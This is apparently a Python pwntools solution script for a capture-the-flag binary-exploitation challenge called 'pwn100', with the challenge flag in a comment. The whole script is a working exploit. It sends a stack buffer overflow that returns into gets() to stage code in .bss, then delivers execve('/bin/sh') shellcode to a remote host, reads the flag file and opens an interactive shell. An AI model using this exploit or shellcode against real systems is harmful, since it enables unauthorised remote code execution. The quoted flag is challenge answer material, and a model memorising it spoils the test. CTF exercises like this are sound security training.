#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# Bugs_Bunny{ohhhh_you_look_you_are_gooD_hacker_Maybe_Iknow_you:p}

host , port = '54.153.19.139' , 5252
#host , port = '192.168.78.133' , 4000
y = remote( host , port )

e = ELF('pwn100')

p = 'D' * 0x18
p += 'EBBP'
p += p32( e.plt['gets'] )
p += p32( e.bss() + 0x10 )
p += p32( e.bss() + 0x10 )

y.sendline( p )

sc = 'jhh///sh/binj\x0bX\x89\xe31\xc9\x99\xcd\x80'

sleep( 0.7 )

y.sendline( sc )

y.sendline( 'cat /home/`whoami`/flag' )


y.interactive()